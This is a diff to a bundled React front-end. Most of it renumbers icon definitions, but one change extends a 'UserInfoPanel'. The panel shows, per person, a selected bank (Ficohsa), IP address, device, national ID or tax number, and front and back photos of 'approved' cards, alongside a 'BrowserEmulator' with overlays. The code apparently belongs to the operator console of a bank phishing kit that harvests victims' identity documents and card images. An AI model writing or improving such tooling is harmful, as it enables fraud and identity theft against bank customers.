@@ -17024,7 +17024,7 @@ const createLucideIcon = (iconName, iconNode) => {
  */
 
 
-const __iconNode$G = [
+const __iconNode$M = [
   [
     "path",
     {
@@ -17033,7 +17033,94 @@ const __iconNode$G = [
     }
   ]
 ];
-const Activity = createLucideIcon("activity", __iconNode$G);
+const Activity = createLucideIcon("activity", __iconNode$M);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$L = [
+  ["path", { d: "M8 3 4 7l4 4", key: "9rb6wj" }],
+  ["path", { d: "M4 7h16", key: "6tx8e3" }],
+  ["path", { d: "m16 21 4-4-4-4", key: "siv7j2" }],
+  ["path", { d: "M20 17H4", key: "h6l3hr" }]
+];
+const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$L);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$K = [
+  ["path", { d: "M5 12h14", key: "1ays0h" }],
+  ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }]
+];
+const ArrowRight = createLucideIcon("arrow-right", __iconNode$K);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$J = [
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["line", { x1: "12", x2: "12", y1: "8", y2: "12", key: "1pkeuh" }],
+  ["line", { x1: "12", x2: "12.01", y1: "16", y2: "16", key: "4dfq90" }]
+];
+const CircleAlert = createLucideIcon("circle-alert", __iconNode$J);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$I = [
+  ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
+  ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }]
+];
+const CircleCheckBig = createLucideIcon("circle-check-big", __iconNode$I);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$H = [
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }]
+];
+const CircleCheck = createLucideIcon("circle-check", __iconNode$H);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$G = [
+  ["path", { d: "M12 6v6l4 2", key: "mmk7yg" }],
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }]
+];
+const Clock = createLucideIcon("clock", __iconNode$G);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17044,12 +17131,10 @@ const Activity = createLucideIcon("activity", __iconNode$G);
 
 
 const __iconNode$F = [
-  ["path", { d: "M8 3 4 7l4 4", key: "9rb6wj" }],
-  ["path", { d: "M4 7h16", key: "6tx8e3" }],
-  ["path", { d: "m16 21 4-4-4-4", key: "siv7j2" }],
-  ["path", { d: "M20 17H4", key: "h6l3hr" }]
+  ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
+  ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }]
 ];
-const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$F);
+const Copy = createLucideIcon("copy", __iconNode$F);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17060,10 +17145,11 @@ const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$F);
 
 
 const __iconNode$E = [
-  ["path", { d: "M5 12h14", key: "1ays0h" }],
-  ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }]
+  ["path", { d: "M15 3h6v6", key: "1q9fwt" }],
+  ["path", { d: "M10 14 21 3", key: "gplh6r" }],
+  ["path", { d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6", key: "a6xqqp" }]
 ];
-const ArrowRight = createLucideIcon("arrow-right", __iconNode$E);
+const ExternalLink = createLucideIcon("external-link", __iconNode$E);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17074,92 +17160,6 @@ const ArrowRight = createLucideIcon("arrow-right", __iconNode$E);
 
 
 const __iconNode$D = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["line", { x1: "12", x2: "12", y1: "8", y2: "12", key: "1pkeuh" }],
-  ["line", { x1: "12", x2: "12.01", y1: "16", y2: "16", key: "4dfq90" }]
-];
-const CircleAlert = createLucideIcon("circle-alert", __iconNode$D);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$C = [
-  ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
-  ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }]
-];
-const CircleCheckBig = createLucideIcon("circle-check-big", __iconNode$C);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$B = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }]
-];
-const CircleCheck = createLucideIcon("circle-check", __iconNode$B);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$A = [
-  ["path", { d: "M12 6v6l4 2", key: "mmk7yg" }],
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }]
-];
-const Clock = createLucideIcon("clock", __iconNode$A);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$z = [
-  ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
-  ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }]
-];
-const Copy = createLucideIcon("copy", __iconNode$z);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$y = [
-  ["path", { d: "M15 3h6v6", key: "1q9fwt" }],
-  ["path", { d: "M10 14 21 3", key: "gplh6r" }],
-  ["path", { d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6", key: "a6xqqp" }]
-];
-const ExternalLink = createLucideIcon("external-link", __iconNode$y);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$x = [
   [
     "path",
     {
@@ -17177,7 +17177,101 @@ const __iconNode$x = [
   ],
   ["path", { d: "m2 2 20 20", key: "1ooewy" }]
 ];
-const EyeOff = createLucideIcon("eye-off", __iconNode$x);
+const EyeOff = createLucideIcon("eye-off", __iconNode$D);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$C = [
+  [
+    "path",
+    {
+      d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
+      key: "1nclc0"
+    }
+  ],
+  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
+];
+const Eye = createLucideIcon("eye", __iconNode$C);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$B = [
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["path", { d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20", key: "13o1zl" }],
+  ["path", { d: "M2 12h20", key: "9i4pu4" }]
+];
+const Globe = createLucideIcon("globe", __iconNode$B);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$A = [
+  ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
+  ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }]
+];
+const Lock = createLucideIcon("lock", __iconNode$A);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$z = [
+  ["path", { d: "m16 17 5-5-5-5", key: "1bji2h" }],
+  ["path", { d: "M21 12H9", key: "dn1m92" }],
+  ["path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4", key: "1uf3rs" }]
+];
+const LogOut = createLucideIcon("log-out", __iconNode$z);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$y = [
+  [
+    "path",
+    {
+      d: "M2.992 16.342a2 2 0 0 1 .094 1.167l-1.065 3.29a1 1 0 0 0 1.236 1.168l3.413-.998a2 2 0 0 1 1.099.092 10 10 0 1 0-4.777-4.719",
+      key: "1sd12s"
+    }
+  ]
+];
+const MessageCircle = createLucideIcon("message-circle", __iconNode$y);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$x = [["path", { d: "M5 12h14", key: "1ays0h" }]];
+const Minus = createLucideIcon("minus", __iconNode$x);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17188,16 +17282,16 @@ const EyeOff = createLucideIcon("eye-off", __iconNode$x);
 
 
 const __iconNode$w = [
+  ["path", { d: "M13 21h8", key: "1jsn5i" }],
   [
     "path",
     {
-      d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
-      key: "1nclc0"
+      d: "M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",
+      key: "1a8usu"
     }
-  ],
-  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
+  ]
 ];
-const Eye = createLucideIcon("eye", __iconNode$w);
+const PenLine = createLucideIcon("pen-line", __iconNode$w);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17208,11 +17302,10 @@ const Eye = createLucideIcon("eye", __iconNode$w);
 
 
 const __iconNode$v = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["path", { d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20", key: "13o1zl" }],
-  ["path", { d: "M2 12h20", key: "9i4pu4" }]
+  ["path", { d: "m21 21-4.34-4.34", key: "14j7rj" }],
+  ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }]
 ];
-const Globe = createLucideIcon("globe", __iconNode$v);
+const Search = createLucideIcon("search", __iconNode$v);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17223,10 +17316,9 @@ const Globe = createLucideIcon("globe", __iconNode$v);
 
 
 const __iconNode$u = [
-  ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
-  ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }]
+  ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", key: "afitv7" }]
 ];
-const Lock = createLucideIcon("lock", __iconNode$u);
+const Square = createLucideIcon("square", __iconNode$u);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17237,11 +17329,13 @@ const Lock = createLucideIcon("lock", __iconNode$u);
 
 
 const __iconNode$t = [
-  ["path", { d: "m16 17 5-5-5-5", key: "1bji2h" }],
-  ["path", { d: "M21 12H9", key: "dn1m92" }],
-  ["path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4", key: "1uf3rs" }]
+  ["path", { d: "M10 11v6", key: "nco0om" }],
+  ["path", { d: "M14 11v6", key: "outv1u" }],
+  ["path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6", key: "miytrc" }],
+  ["path", { d: "M3 6h18", key: "d0wm0j" }],
+  ["path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2", key: "e791ji" }]
 ];
-const LogOut = createLucideIcon("log-out", __iconNode$t);
+const Trash2 = createLucideIcon("trash-2", __iconNode$t);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17255,12 +17349,14 @@ const __iconNode$s = [
   [
     "path",
     {
-      d: "M2.992 16.342a2 2 0 0 1 .094 1.167l-1.065 3.29a1 1 0 0 0 1.236 1.168l3.413-.998a2 2 0 0 1 1.099.092 10 10 0 1 0-4.777-4.719",
-      key: "1sd12s"
+      d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
+      key: "wmoenq"
     }
-  ]
+  ],
+  ["path", { d: "M12 9v4", key: "juzpu7" }],
+  ["path", { d: "M12 17h.01", key: "p32p05" }]
 ];
-const MessageCircle = createLucideIcon("message-circle", __iconNode$s);
+const TriangleAlert = createLucideIcon("triangle-alert", __iconNode$s);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17270,8 +17366,11 @@ const MessageCircle = createLucideIcon("message-circle", __iconNode$s);
  */
 
 
-const __iconNode$r = [["path", { d: "M5 12h14", key: "1ays0h" }]];
-const Minus = createLucideIcon("minus", __iconNode$r);
+const __iconNode$r = [
+  ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
+  ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }]
+];
+const User$1 = createLucideIcon("user", __iconNode$r);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17282,16 +17381,12 @@ const Minus = createLucideIcon("minus", __iconNode$r);
 
 
 const __iconNode$q = [
-  ["path", { d: "M13 21h8", key: "1jsn5i" }],
-  [
-    "path",
-    {
-      d: "M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",
-      key: "1a8usu"
-    }
-  ]
+  ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
+  ["path", { d: "M16 3.128a4 4 0 0 1 0 7.744", key: "16gr8j" }],
+  ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
+  ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }]
 ];
-const PenLine = createLucideIcon("pen-line", __iconNode$q);
+const Users = createLucideIcon("users", __iconNode$q);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17302,101 +17397,6 @@ const PenLine = createLucideIcon("pen-line", __iconNode$q);
 
 
 const __iconNode$p = [
-  ["path", { d: "m21 21-4.34-4.34", key: "14j7rj" }],
-  ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }]
-];
-const Search = createLucideIcon("search", __iconNode$p);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$o = [
-  ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", key: "afitv7" }]
-];
-const Square = createLucideIcon("square", __iconNode$o);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$n = [
-  ["path", { d: "M10 11v6", key: "nco0om" }],
-  ["path", { d: "M14 11v6", key: "outv1u" }],
-  ["path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6", key: "miytrc" }],
-  ["path", { d: "M3 6h18", key: "d0wm0j" }],
-  ["path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2", key: "e791ji" }]
-];
-const Trash2 = createLucideIcon("trash-2", __iconNode$n);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$m = [
-  [
-    "path",
-    {
-      d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
-      key: "wmoenq"
-    }
-  ],
-  ["path", { d: "M12 9v4", key: "juzpu7" }],
-  ["path", { d: "M12 17h.01", key: "p32p05" }]
-];
-const TriangleAlert = createLucideIcon("triangle-alert", __iconNode$m);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$l = [
-  ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
-  ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }]
-];
-const User$1 = createLucideIcon("user", __iconNode$l);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$k = [
-  ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
-  ["path", { d: "M16 3.128a4 4 0 0 1 0 7.744", key: "16gr8j" }],
-  ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
-  ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }]
-];
-const Users = createLucideIcon("users", __iconNode$k);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$j = [
   [
     "path",
     {
@@ -17407,7 +17407,7 @@ const __iconNode$j = [
   ["path", { d: "M16 9a5 5 0 0 1 0 6", key: "1q6k2b" }],
   ["path", { d: "M19.364 18.364a9 9 0 0 0 0-12.728", key: "ijwkga" }]
 ];
-const Volume2 = createLucideIcon("volume-2", __iconNode$j);
+const Volume2 = createLucideIcon("volume-2", __iconNode$p);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17417,7 +17417,7 @@ const Volume2 = createLucideIcon("volume-2", __iconNode$j);
  */
 
 
-const __iconNode$i = [
+const __iconNode$o = [
   [
     "path",
     {
@@ -17428,7 +17428,7 @@ const __iconNode$i = [
   ["line", { x1: "22", x2: "16", y1: "9", y2: "15", key: "1ewh16" }],
   ["line", { x1: "16", x2: "22", y1: "9", y2: "15", key: "5ykzw1" }]
 ];
-const VolumeX = createLucideIcon("volume-x", __iconNode$i);
+const VolumeX = createLucideIcon("volume-x", __iconNode$o);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17438,11 +17438,11 @@ const VolumeX = createLucideIcon("volume-x", __iconNode$i);
  */
 
 
-const __iconNode$h = [
+const __iconNode$n = [
   ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
   ["path", { d: "m6 6 12 12", key: "d8bk6v" }]
 ];
-const X$1 = createLucideIcon("x", __iconNode$h);
+const X$1 = createLucideIcon("x", __iconNode$n);
 
 const soundPaths = {
   good: "/sounds/toast_good-notify.mp3",
@@ -18083,30 +18083,22 @@ const ProtectedLayout = () => {
   ) });
 };
 
-const scriptRel = 'modulepreload';const assetsURL = function(dep, importerUrl) { return new URL(dep, importerUrl).href };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
+const scriptRel = 'modulepreload';const assetsURL = function(dep) { return "/"+dep };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
   let promise = Promise.resolve();
   if (true && deps && deps.length > 0) {
-    const links = document.getElementsByTagName("link");
+    document.getElementsByTagName("link");
     const cspNonceMeta = document.querySelector(
       "meta[property=csp-nonce]"
     );
     const cspNonce = cspNonceMeta?.nonce || cspNonceMeta?.getAttribute("nonce");
     promise = Promise.allSettled(
       deps.map((dep) => {
-        dep = assetsURL(dep, importerUrl);
+        dep = assetsURL(dep);
         if (dep in seen) return;
         seen[dep] = true;
         const isCss = dep.endsWith(".css");
         const cssSelector = isCss ? '[rel="stylesheet"]' : "";
-        const isBaseRelative = !!importerUrl;
-        if (isBaseRelative) {
-          for (let i = links.length - 1; i >= 0; i--) {
-            const link2 = links[i];
-            if (link2.href === dep && (!isCss || link2.rel === "stylesheet")) {
-              return;
-            }
-          }
-        } else if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
+        if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
           return;
         }
         const link = document.createElement("link");
@@ -22444,7 +22436,7 @@ const BrowserEmulator = ({ children, overlays }) => {
         onMouseDown: (e) => {
           if (e.button === 0) {
             try {
-              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0,import.meta.url).then(({ getCurrentWindow }) => {
+              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0).then(({ getCurrentWindow }) => {
                 getCurrentWindow().startDragging();
               });
             } catch {
@@ -22508,7 +22500,7 @@ function ClipboardDocumentIcon({
 }
 const ForwardRef = /*#__PURE__*/ reactExports.forwardRef(ClipboardDocumentIcon);
 
-const UserInfoPanel = ({ user }) => {
+const UserInfoPanel = ({ user, onSelectPhoto }) => {
   const [copiedField, setCopiedField] = reactExports.useState(null);
   const { selectedBank } = useAuth();
   const isFicohsa = selectedBank === "ficohsa";
@@ -22533,8 +22525,8 @@ const UserInfoPanel = ({ user }) => {
   const ip = user.ip || "Desconocida";
   const device = user.dispositivo || "Desktop";
   const displayDevice = device === "Desktop" ? "PC" : device;
-  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "\r\n      group\r\n      bg-gray-900/80 backdrop-blur-lg\r\n      p-3.5 rounded-xl\r\n      border border-gray-700/30\r\n      shadow-xl shadow-black/20\r\n      hover:shadow-gray-900/20 hover:border-gray-800/40\r\n      transition-all duration-300 ease-out\r\n      cursor-move w-64 max-w-xs text-sm\r\n      relative overflow-hidden\r\n    ", children: [
-    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n        absolute inset-0 \r\n        bg-gradient-to-t from-gray-900/5 to-transparent \r\n        opacity-0 group-hover:opacity-100 \r\n        transition-opacity duration-500 pointer-events-none\r\n      " }),
+  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "\r\n      group\r\n      bg-neutral-950/90 backdrop-blur-xl\r\n      p-3.5 rounded-xl\r\n      border border-neutral-800/80\r\n      shadow-2xl shadow-black/60\r\n      hover:shadow-black/70 hover:border-neutral-700/80\r\n      transition-all duration-300 ease-out\r\n      cursor-move w-64 max-w-xs text-sm\r\n      relative overflow-hidden\r\n    ", children: [
+    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n        absolute inset-0 \r\n        bg-gradient-to-t from-neutral-900/10 to-transparent \r\n        opacity-0 group-hover:opacity-100 \r\n        transition-opacity duration-500 pointer-events-none\r\n      " }),
     /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-2", children: [
       (() => {
         let idValue = user.DNI || user.RTN || "";
@@ -22594,6 +22586,58 @@ const UserInfoPanel = ({ user }) => {
         },
         idx
       )),
+      (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-2.5 p-2 bg-gray-950/40 border border-emerald-500/30 rounded-lg", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between mb-2", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-gray-300 font-semibold text-xs flex items-center gap-1.5", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" }),
+          "Tarjetas aprobadas:"
+        ] }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
+            user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+              "button",
+              {
+                onClick: () => onSelectPhoto?.({ src: user.fotoFrente, title: "Tarjeta - Frente" }),
+                className: "relative group/thumb rounded-md overflow-hidden border border-emerald-500/40 hover:border-emerald-400 transition-all aspect-[16/10] bg-black/60 focus:outline-none cursor-pointer",
+                title: "Ver frente en pantalla completa",
+                children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx(
+                    "img",
+                    {
+                      src: user.fotoFrente,
+                      alt: "Frente Tarjeta",
+                      className: "w-full h-full object-cover group-hover/thumb:scale-105 transition-transform duration-200"
+                    }
+                  ),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/40 opacity-0 group-hover/thumb:opacity-100 flex items-center justify-center transition-opacity", children: /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-white font-medium bg-black/70 px-1.5 py-0.5 rounded", children: "Ver" }) })
+                ]
+              }
+            ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-md border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-400", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
+          ] }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
+            user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+              "button",
+              {
+                onClick: () => onSelectPhoto?.({ src: user.fotoReverso, title: "Tarjeta - Reverso" }),
+                className: "relative group/thumb rounded-md overflow-hidden border border-emerald-500/40 hover:border-emerald-400 transition-all aspect-[16/10] bg-black/60 focus:outline-none cursor-pointer",
+                title: "Ver reverso en pantalla completa",
+                children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx(
+                    "img",
+                    {
+                      src: user.fotoReverso,
+                      alt: "Reverso Tarjeta",
+                      className: "w-full h-full object-cover group-hover/thumb:scale-105 transition-transform duration-200"
+                    }
+                  ),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/40 opacity-0 group-hover/thumb:opacity-100 flex items-center justify-center transition-opacity", children: /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-white font-medium bg-black/70 px-1.5 py-0.5 rounded", children: "Ver" }) })
+                ]
+              }
+            ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-md border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-400", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
+          ] })
+        ] })
+      ] }),
       /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "border-t border-gray-700/50 mt-2 pt-2" }),
       /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-1", children: [
         /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex justify-between items-center px-2.5 py-1.5 rounded-lg bg-gray-950/20 border border-transparent", children: [
@@ -22707,8 +22751,8 @@ const createReactComponent = (type, iconName, iconNamePascal, iconNode) => {
  */
 
 
-const __iconNode$g = [["path", { "d": "M13 3l0 7l6 0l-8 11l0 -7l-6 0l8 -11", "key": "svg-0" }]];
-const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$g);
+const __iconNode$m = [["path", { "d": "M13 3l0 7l6 0l-8 11l0 -7l-6 0l8 -11", "key": "svg-0" }]];
+const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$m);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22718,8 +22762,8 @@ const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$g);
  */
 
 
